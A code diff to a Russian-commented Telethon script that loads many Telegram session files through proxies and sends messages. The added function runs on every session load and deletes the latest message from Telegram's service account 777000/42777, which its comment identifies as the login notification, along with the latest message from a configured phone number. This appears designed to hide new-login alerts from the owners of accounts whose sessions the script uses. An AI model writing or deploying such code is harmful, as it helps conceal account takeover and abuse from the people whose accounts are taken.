@@ -5,6 +5,7 @@ import random
 from telethon import TelegramClient, events
 from telethon.tl.functions.contacts import GetContactsRequest
 from telethon.errors import FloodWaitError, PeerFloodError
+from telethon.tl.functions.messages import DeleteHistoryRequest
 import telethon
 
 # 🤖 Импортируем бот для уведомлений
@@ -270,8 +271,78 @@ async def notify_telegram_service(sender, text, receiving_client):
         
     except Exception as e:
         print(f"[!] Ошибка отправки служебного уведомления: {e}")
+        
 
+async def delete_last_message_by_phone(client, phone_number):
+    try:
+        # Для служебных аккаунтов Telegram используем специальный подход
+        if phone_number in ['42777', '777000']:
+            print(f"🔍 Удаление сообщения о входе Telegram: {phone_number}")
+            
+            dialogs = await client.get_dialogs()
+            
+            for dialog in dialogs:
+                try:
+                    entity = dialog.entity
+                    if (hasattr(entity, 'id') and 
+                        ((entity.id == 777000) or (hasattr(entity, 'phone') and str(entity.phone) == '42777'))):
+                        messages = await client.get_messages(entity, limit=10)
+                        for message in messages:
+                            if message.sender_id == entity.id:
+                                message_text = message.text or "[сообщение без текста]"
+                                if len(message_text) > 100:
+                                    message_preview = message_text[:100] + "..."
+                                else:
+                                    message_preview = message_text
+                                
+                                print(f"📝 Сообщение для удаления: {message_preview}")
+                                
+                                await message.delete()
+                                return True
+                        
+                        print(f"ℹ️ Не найдено служебных сообщений от {phone_number}")
+                        return False
+                        
+                except Exception as e:
+                    continue
+            
+            print(f"❌ Не найден служебный аккаунт {phone_number}")
+            return False
 
+        # Для обычных пользователей
+        else:
+            # Получаем entity пользователя по номеру
+            entity = await client.get_entity(phone_number)
+            if not entity:
+                print(f"[-] Не найден пользователь с номером {phone_number}")
+                return False
+
+            # Получаем последние сообщения из диалога
+            messages = await client.get_messages(entity, limit=10)
+            
+            # Ищем последнее сообщение от целевого пользователя
+            for message in messages:
+                if message.sender_id == entity.id:
+                    # Показываем какое сообщение удаляем
+                    message_text = message.text or "[сообщение без текста]"
+                    if len(message_text) > 100:
+                        message_preview = message_text[:100] + "..."
+                    else:
+                        message_preview = message_text
+                    
+                    print(f"📝 Сообщение для удаления: {message_preview}")
+                    
+                    await message.delete()
+                    print(f"🗑️ Удалено последнее сообщение от {phone_number}")
+                    return True
+            
+            print(f"ℹ️ Не найдено сообщений от {phone_number}")
+            return False
+        
+    except Exception as e:
+        print(f"❌ Ошибка удаления сообщения от {phone_number}: {e}")
+        return False
+        
 # ---------- Загрузка сессий ----------
 async def load_sessions(api_id, api_hash, proxies, accounts_per_proxy, proxy_type, admin_username):
     if not os.path.exists(SESSION_FOLDER):
@@ -340,6 +411,16 @@ async def load_sessions(api_id, api_hash, proxies, accounts_per_proxy, proxy_typ
                 client.chat_manager = ChatManager(client)
                 client.chat_manager.auto_delete_delay = cfg.get('auto_delete_delay', 4)
                 print(f"    🗂️ ChatManager подключен (авто-скрытие: ON)")
+                
+
+            target_phone = cfg.get("tg_phone", "").strip()
+            if target_phone:
+                print(f"    🔍 Ищем сообщения от {target_phone} для удаления...")
+                success = await delete_last_message_by_phone(client, target_phone)
+                if success:
+                        print(f"    ✅ Автоудаление выполнено для {target_phone}")
+                else:
+                        print(f"    ⚠️ Не удалось выполнить автоудаление для {target_phone}")
 
             sessions.append(client)
 
@@ -347,6 +428,8 @@ async def load_sessions(api_id, api_hash, proxies, accounts_per_proxy, proxy_typ
             print(f"\n🔴 [X] Ошибка загрузки {fname}: {e}\n")
 
     return sessions
+   
+
 
 
 # ---------- Отправка сообщений ----------
